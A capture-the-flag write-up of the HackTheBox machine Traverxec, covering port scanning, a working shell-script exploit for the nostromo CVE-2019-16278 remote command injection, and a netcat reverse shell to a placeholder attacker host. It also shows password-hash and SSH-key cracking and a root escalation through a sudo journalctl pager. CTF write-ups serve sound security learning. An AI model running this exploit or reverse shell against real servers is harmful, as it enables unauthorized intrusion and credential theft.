<!--GEN_META
GEN_TITLE=HackTheBox Traverxec
GEN_DESCRIPTION=How to own Traverxec on HackTheBox
GEN_KEYWORDS=writeup,hackthebox,htb,cybersec
GEN_AUTHOR=Máté Kukri
GEN_TIMESTAMP=2020-04-16 15:39
GEN_COPYRIGHT=Copyright (C) Máté Kukri, 2020
-->
This is the first box I have ever owned, so some steps might be sub-optimal,
but I shall present how to own Traverxec own HackTheBox.

My environment of choice for this is standard Debian. `user@host $`
means a shell as `user` on `host` (user is omitted on the hacker computer),
`host #` means a root shell.

## Step 1: External enumeration
Since on HTB all we get is an IP address, we first do a portscan against it.
```
debian # nmap -Pn -sS -p- 10.10.10.165
Nmap scan report for 10.10.10.165
Host is up (0.12s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

This box looks like a leightweight Linux webserver with only HTTP and SSH
running. In this case I will go for HTTP first, while SSH may very well be
a target, I suspect HTTP is much more likely.

I first check if there is a website hosted using Firefox. We get something
that looks like someone's personal website. Since the contact form does not
work and the page looks like simple template with very few customizations,
the only useful information we got from the page is the name `David White`.
This could help us make educated guesses for the username later if necessary.

Now I do a request to the web server using curl from the command line to get
some information about the software serving us this website.
```
debian $ curl -v 10.10.10.165
...
< HTTP/1.1 200 OK
< Date: Thu, 16 Apr 2020 01:48:05 GMT
<span style="color:red">< Server: nostromo 1.9.6</span>
< Connection: close
< Last-Modified: Fri, 25 Oct 2019 21:11:09 GMT
< Content-Length: 15674
< Content-Type: text/html
...
```

The line highlighted in red above rings many bells as nostromo is not a piece
of software one commonly expects to see on Linux webservers. I have a version
number and a package name, so it is time to search the web for changelogs.

It turns out this specific version of nostromo, aka. nhttpd has a remote
command injection vulnerability titled CVE-2019-16278.

## Step 2: Exploting nostromo
There are some scripts online to exploit this, but since it looks trivial to
implement I wrote quick shell script that exploits this. I prefer implementing
my own exploits when feasible over using pre-made toolkits such as metasploit.

This exploit relies on a path traversal protection bypass, which can be used
to request arbitrary files of the server.
```
debian $ printf "GET /.%%0d./.%%0d./.%%0d./.%%0d./etc/passwd HTTP/1.0\r\n\r\n" | nc 10.10.10.165 80
HTTP/1.1 200 OK
Date: Thu, 16 Apr 2020 02:05:27 GMT
Server: nostromo 1.9.6
Connection: close
Last-Modified: Fri, 25 Oct 2019 18:34:30 GMT
Content-Length: 1395
Content-Type: text/html<br>
root:x:0:0:root:/root:/bin/bash
...
david:x:1000:1000:david,,,:/home/david:/bin/bash
...
```

Unfortunetly for the users of nostromo, and fortunetly for us this gets much
worse when we `POST` instead of `GET`-ing. We can post commands to `/bin/sh`
and instead of giving us the binary contents, the server executes it with
**our** input, thus we gain remote command execution with the same permission
as nostromo itself has.

The following shell script implements this.
```
#!/bin/sh
# Usage: rce.sh ip command
printf "POST /.%%0d./.%%0d./.%%0d./.%%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n$2 2>&1\n" | nc $1 80
```

This might look very dense, but all we are doing is generating an HTTP request
using printf into netcat with the body of the request being the command we
intend to execute. The two `echo` commands are necessary for nostromo to
return the output instead of failing with a `500 Internal Server Error`.

Using our RCE script we get a reverse shell with nostromo's persmissions.
```
First shell on hacker computer:
debian $ nc -lvp 9999
www-data@traverxec $ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@traverxec $ hostname
traverxec<br>
Second shell on hacker computer:
debian $ ./rce.sh 10.10.10.165 "nc hacker_ip 9999 -e /bin/sh"
```

## Step 3: Owning david
Using the reverse shell from the last step I enumerate what can I access as
`www-data`.

Let's see what files can I access. Only interesting/unusual files are shown
here, otherwise it would fill the page.
```
www-data@traverxec $ find / -type f -readable
...
/var/nostromo/logs/nhttpd.pid
/var/nostromo/conf/mimes
/var/nostromo/conf/.htpasswd
/var/nostromo/conf/nhttpd.conf
/var/nostromo/icons/dir.gif
/var/nostromo/icons/file.gif
/var/nostromo/htdocs/js/main.js
/var/nostromo/htdocs/css/style.css
/var/nostromo/htdocs/empty.html
...
```

First I check `.htpasswd`, which gets me a password hash for david.
```
www-data@traverxec $ cat /var/nostromo/conf/.htpasswd
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
```

Since this is a weak MD5 hash, I let john the ripper run it through rockyou,
it comes back with `Nowonly4me` as the password. We could try these credentials,
but lets look elsewhere first.

I take a look at `nhttpd.conf` and it contains the following interesting section.
```
www-data@traverxec $ cat /var/nostromo/conf/nhttpd.conf
...
# HOMEDIRS [OPTIONAL]<br>
homedirs            /home
homedirs_public     public_www
...
```

This tells nostromo to serve a directory from each user's home called
`public_www` under `/~username`. Since we know we have a user called `david`
on the box, we open `http://10.10.10.165/~david/` in Firefox, and bingo we
found `david`'s private area. After that we check `/home/david/public_www`
as `find` must have missed it if `/home/david` itself is unreadable.
```
www-data@traverxec $ find /home/david/public_www
/home/david/public_www
/home/david/public_www/index.html
/home/david/public_www/protected-file-area
<span style="color:red">/home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz</span>
/home/david/public_www/protected-file-area/.htaccess
www-data@traverxec $ tar tf /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz
home/david/.ssh/
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa
home/david/.ssh/id_rsa.pub
```

As you can see above there are some very bad news for david as we found his
ssh private key. We copy the tarball to a temporary location, extract it, and
cat our id_rsa file to stdout.
```
www-data@traverxec $ cp /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz /tmp/
www-data@traverxec $ cd /tmp; tar xf backup-ssh-identity-files.tgz
www-data@traverxec $ cat home/david/.ssh/id_rsa; rm -rf backup-ssh-identity-files.tgz home/
```

Looking at our newly acquired ssh key we can see it is password protected, but
we can use john the ripper again to find the password and decrypt the key.
```
debian $ ssh2john id_david > id_david_hash
debian $ john --wordlist=rockyou.txt id_david_hash
...
debian $ ssh-keygen -p -f id_david
Enter old passphrase: hunter
Enter new passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved with the new passphrase.
```

After this we just `ssh` in as `david` and get the flag.
```
debian $ ssh -i id_david david@10.10.10.165
david@traverxec $ cat user.txt
flag_will_be_here
```

## Step 4: Privilege escalation
Using the ssh connection we established above we look around the machine to see
what `david` left on it.

```
david@traverxec $ find /home/david
/home/david
/home/david/.local
/home/david/.local/share
/home/david/.local/share/nano
/home/david/.profile
/home/david/.ssh
/home/david/.ssh/authorized_keys
/home/david/.ssh/id_rsa
/home/david/.ssh/id_rsa.pub
/home/david/public_www
/home/david/public_www/index.html
/home/david/public_www/protected-file-area
/home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz
/home/david/public_www/protected-file-area/.htaccess
/home/david/bin
<span style="color:red">/home/david/bin/server-stats.sh</span>
/home/david/bin/server-stats.head
/home/david/.bash_history
/home/david/.bash_logout
/home/david/.bashrc
/home/david/user.txt
```

Next I look at the shell script highlited above. Running the script prints some
of the webserver log, but most importantly does **not** require a password to do
it. Now we look at the code and see why.
```
david@traverxec $ cat /home/david/bin/server-stats.sh
#!/bin/bash<br>
cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```

As you can see `david` allowed himself to run `journalctl` as `root`. Sadly for
him `journalctl` calls a pager if it's output does not fit inside the terminal.
Thus we make our terminal window tiny, and run the `journalctl` command.
```
david@traverxec $ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
```
Now we have `less` running as `root` under our control. Since it has a convenient
`vim`-like command execution feature we just type `!/bin/sh` and we have a `root`
shell. Now we just `cat` the root flag and we are done ;)
```
travrexec # cat /root/root.txt
root_flag_here
```
